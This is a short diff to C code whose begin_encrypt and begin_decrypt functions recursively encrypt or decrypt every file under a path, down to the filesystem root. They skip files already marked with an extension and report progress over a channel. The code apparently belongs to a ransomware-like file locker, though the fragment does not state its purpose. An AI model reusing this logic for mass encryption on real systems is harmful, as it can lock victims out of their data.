@@ -137,10 +137,13 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
             strcmp(dir->d_name, "..") != 0 &&
             strstr(dir->d_name, extension) == NULL) {
 
-            target = link_string(path, dir->d_name, 1);
+            if (strcmp(path, "/") == 0)
+                target = link_string(path, dir->d_name, 0);
+            else
+                target = link_string(path, dir->d_name, 1);
 
             name = link_string("Encrypting ", target, 0);
-            name = link_string(name, "\n", 0);
+            name = link_string(name, "...\n", 0);
 
             send_channel(channel, name);
             recursive_encrypt(target, key, iv);
@@ -168,10 +171,13 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
         if (strcmp(dir->d_name, ".") != 0 &&
             strcmp(dir->d_name, "..") != 0) {
 
-            target = link_string(path, dir->d_name, 1);
+            if (strcmp(path, "/") == 0)
+                target = link_string(path, dir->d_name, 0);
+            else
+                target = link_string(path, dir->d_name, 1);
 
             name = link_string("Decrypting ", target, 0);
-            name = link_string(name, "\n", 0);
+            name = link_string(name, "...\n", 0);
 
             send_channel(channel, name);
             recursive_decrypt(target, key, iv);
